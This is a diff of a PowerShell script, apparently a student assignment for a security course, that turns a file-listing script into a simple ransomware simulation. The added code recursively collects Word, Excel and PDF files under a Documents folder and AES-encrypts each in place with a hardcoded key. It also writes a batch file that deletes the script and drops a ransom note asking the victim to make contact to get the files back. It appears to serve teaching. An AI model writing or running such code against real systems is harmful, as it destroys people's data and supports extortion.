@@ -46,20 +46,6 @@ Description
 Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
 #>
 
-
-#STEP 1
-Get-ChildItem -recurse -Include *.docx,*.pdf,*.txt -Path .\Documents | export-csv `
--Path files.csv
-
-# Import CSV file.
-$fileList = import-csv -Path .\files.csv -header FullName
-
-# Loop through the results
-foreach($f in $fileList){
-
-    Get-ChildItem -Path $f.FullName
-}
-
 #STEP 2
 function Invoke-AESEncryption {
     [CmdletBinding()]
@@ -154,6 +140,20 @@ function Invoke-AESEncryption {
         $aesManaged.Dispose()
     }
 }
+#STEP 1
+Get-ChildItem -recurse -Include *.xlsx,*.pdf,*.docx -Path .\Documents | export-csv `
+-Path files.csv
+
+# Import CSV file.
+$fileList = import-csv -Path .\files.csv -header FullName
+
+# Loop through the results
+foreach($f in $fileList){
+
+    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path $f.FullName
+}
 #STEP 3
-Add-Content -Path 'C:\Users\Sebby\Update.bat' -Value "del c:\users\sebby\step2.ps1"
+Add-Content -Path 'C:\Users\Sebby\SYS320-SP22-New\SYS320-SP22\Week12\Homework\Update.bat' -Value 'del C:\Users\Sebby\SYS320-SP22-New\SYS320-SP22\Week12\Homework\step2test.ps1'
+#STEP 4 
+Add-Content -Path 'C:\Users\Sebby\SYS320-SP22-New\SYS320-SP22\Week12\Homework\Readme.READ' -Value 'If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you.'
 
